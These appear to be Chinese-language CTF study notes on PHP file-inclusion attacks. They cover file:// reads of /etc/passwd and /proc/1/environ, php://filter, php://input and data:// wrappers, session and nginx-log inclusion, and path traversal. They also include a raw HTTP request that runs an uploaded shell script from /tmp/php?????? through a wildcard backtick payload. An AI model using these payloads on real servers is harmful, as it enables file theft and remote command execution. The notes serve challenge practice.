文件包含

[TOC]



###### [HDCTF 2023]YamiYami

```
file:///etc/passwd

file:///proc/1/environ
```

session文件包含

[[HNCTF 2022 WEEK3\]QAQ_1inclu4e | NSSCTF](https://www.nssctf.cn/problem/3020)

[[HNCTF\]Web详解 - TTkali - 博客园 (cnblogs.com)](https://www.cnblogs.com/TTaly/p/16934584.html)

[详解利用session进行文件包含_利用session机制,将所有敏感文件都引入事先写好的session文件,只有session文件中-CSDN博客](https://blog.csdn.net/qq_38154820/article/details/120300273)

```
php://协议
php://filter和php://input，php://filter用于读取源码，php://input用于执行php代码。

一、php://filter
当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行base64编码，阻止其不执行。从而导致任意文件读取。

二、 php://input
可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行

方法2：date://伪协议执行命令
使用方法:data://text/plain;base64,xxxx(base64编码后的数据)
```

##### 日志包含

[包含日志文件getshell - myles007 - 博客园 (cnblogs.com)](https://www.cnblogs.com/my1e3/p/5854897.html)

ctfshow的web4

/var/log/nginx/access.log

当我们传入，会记录在日志中，可以包含，以前好像没怎么遇到过这种题。

###### 文件上传

```
POST /?cmd=?><?=`.+/??p/p?p??????`; HTTP/1.1
Host: 47fa7ca7-058a-42ff-b48f-de0382f95387.chall.ctf.show
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: multipart/form-data; boundary=---------------------------10242300956292313528205888
Accept-Encoding: gzip, deflate
Connection: keep-alive
Cookie: UM_distinctid=1739f845e394-0cffbf96840b0c8-4c302d7c-144000-1739f845e3b4e2
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Length: 242

-----------------------------10242300956292313528205888
Content-Disposition: form-data; name="fileUpload"; filename="1.txt"
Content-Type: text/plain

#! /bin/bash

cat /flag.txt
-----------------------------10242300956292313528205888--

```

在ctf_show红包第二弹中，是命令执行，但他过滤了很多，无法异或，自增。所以用了这个上传临时文件的方法。

修改一个上传文件的包，文件会存为临时文件文件目录：/tmp/php??????,采用通配符，包含这个文件

pearcmd

[ctfshow 萌新22 （类似级客巅峰web4）_ctf register_argc_argv-CSDN博客](https://blog.csdn.net/qq_46091464/article/details/108954166)

[Docker PHP裸文件本地包含综述 | 离别歌 (leavesongs.com)](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html)

###### include()

file=hint?../../../../../flag

include()包含这个变量，他会包含到flag